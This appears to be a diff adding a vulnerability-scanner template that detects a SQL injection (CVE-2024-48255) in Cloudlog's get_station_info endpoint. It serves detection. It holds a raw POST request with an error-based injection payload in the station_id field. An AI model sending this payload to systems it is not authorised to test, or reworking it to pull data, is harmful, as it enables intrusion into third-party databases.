@@ -1,0 +1,28 @@
+id: cve-2024-48255
+info:
+  name: Cloudlog get_station_info SQL Injection (CVE-2024-48255)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,CVE-2024-48255
+  description: |
+    A SQL injection vulnerability in Cloudlog's get_station_info endpoint can lead to database errors caused by manipulated inputs.
+variables:
+  t1: '{{rand_int(1000, 9999)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - raw:
+      - |
+        POST /index.php/oqrs/get_station_info HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        station_id=1 and GTID_SUBSET(CONCAT((SELECT(md5({{t1}})))),3119)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - '{{t2}}'
+          - 'Database Error'
